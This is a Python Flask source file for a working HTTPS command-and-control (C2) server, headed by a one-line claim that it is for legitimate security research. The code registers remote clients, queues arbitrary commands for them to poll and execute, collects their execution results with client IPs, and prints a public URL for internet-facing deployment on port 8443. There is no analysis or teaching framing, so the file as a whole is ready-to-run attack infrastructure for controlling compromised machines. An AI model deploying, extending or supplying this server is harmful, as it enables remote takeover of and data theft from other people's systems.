# Internet-ready HTTPS C2 Server
# For legitimate security research and testing purposes

from flask import Flask, request, jsonify
import ssl
import json
import os
import time
import logging
import uuid
import socket

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# In-memory storage for demonstration
commands = {}
responses = {}

@app.route('/register', methods=['POST'])
def register():
    """Register a new client with a unique ID"""
    client_id = str(uuid.uuid4())
    commands[client_id] = []
    responses[client_id] = []
    
    # Record client IP for logging
    client_ip = request.remote_addr
    logging.info(f"New client registered: {client_id} from IP: {client_ip}")
    
    return jsonify({"status": "success", "client_id": client_id})

@app.route('/poll', methods=['POST'])
def poll():
    """Client polls for new commands"""
    data = request.json
    client_id = data.get('client_id')
    
    if not client_id or client_id not in commands:
        return jsonify({"status": "error", "message": "Invalid client ID"}), 401
    
    # Log poll with client IP
    client_ip = request.remote_addr
    logging.info(f"Poll from client {client_id} from IP: {client_ip}")
    
    # Return any pending commands
    pending_commands = commands[client_id]
    commands[client_id] = []
    
    return jsonify({
        "status": "success", 
        "commands": pending_commands
    })

@app.route('/response', methods=['POST'])
def response():
    """Client sends back command execution results"""
    data = request.json
    client_id = data.get('client_id')
    cmd_id = data.get('cmd_id')
    result = data.get('result')
    
    if not client_id or client_id not in responses:
        return jsonify({"status": "error", "message": "Invalid client ID"}), 401
    
    # Store the response with client IP
    client_ip = request.remote_addr
    responses[client_id].append({
        "cmd_id": cmd_id,
        "result": result,
        "timestamp": time.time(),
        "client_ip": client_ip
    })
    
    logging.info(f"Response received from {client_id} (IP: {client_ip}) for command {cmd_id}")
    return jsonify({"status": "success"})

@app.route('/issue_command', methods=['POST'])
def issue_command():
    """Command center issues a new command to a client"""
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or client_id not in commands:
        return jsonify({"status": "error", "message": "Invalid client ID"}), 401
    
    cmd_id = str(uuid.uuid4())
    commands[client_id].append({
        "cmd_id": cmd_id,
        "command": command,
        "timestamp": time.time()
    })
    
    logging.info(f"Command issued to {client_id}: {command}")
    return jsonify({"status": "success", "cmd_id": cmd_id})

@app.route('/get_responses', methods=['POST'])
def get_responses():
    """Command center retrieves stored responses"""
    data = request.json
    client_id = data.get('client_id')
    
    if not client_id or client_id not in responses:
        return jsonify({"status": "error", "message": "Invalid client ID"}), 401
    
    client_responses = responses[client_id]
    # Optionally clear after retrieval
    # responses[client_id] = []
    
    return jsonify({
        "status": "success", 
        "responses": client_responses
    })

@app.route('/list_clients', methods=['GET'])
def list_clients():
    """List all registered clients"""
    client_list = []
    
    for client_id in commands.keys():
        # Get the last response IP if available
        last_ip = "Unknown"
        if client_id in responses and responses[client_id]:
            last_ip = responses[client_id][-1].get("client_ip", "Unknown")
        
        client_list.append({
            "client_id": client_id,
            "last_ip": last_ip,
            "command_count": len(commands[client_id]),
            "response_count": len(responses.get(client_id, []))
        })
    
    return jsonify({
        "status": "success",
        "clients": client_list
    })

# Helper function to get server's public IP
def get_public_ip():
    try:
        # This connects to a public service to get your IP
        import requests
        ip = requests.get('https://api.ipify.org').text
        return ip
    except:
        return "Unknown (check manually at ipify.org)"

if __name__ == "__main__":
    # Display server information
    public_ip = get_public_ip()
    port = 8443
    
    print("\n=== HTTPS C2 Server Configuration ===")
    print(f"Public IP (for internet clients): {public_ip}")
    print(f"Port: {port}")
    print(f"Full URL for clients: https://{public_ip}:{port}")
    print("\nFor local network clients, use one of:")
    
    # Get all local IPs
    hostname = socket.gethostname()
    local_ips = socket.gethostbyname_ex(hostname)[2]
    for ip in local_ips:
        print(f"https://{ip}:{port}")
    
    print("\n======================================\n")
    print("====** && **====\n")
    print("======================================\n")
    
    # For production, use a proper certificate from a trusted CA
    # Generate self-signed for development: 
    # openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    
    app.run(host='0.0.0.0', port=port, ssl_context=context, debug=False)
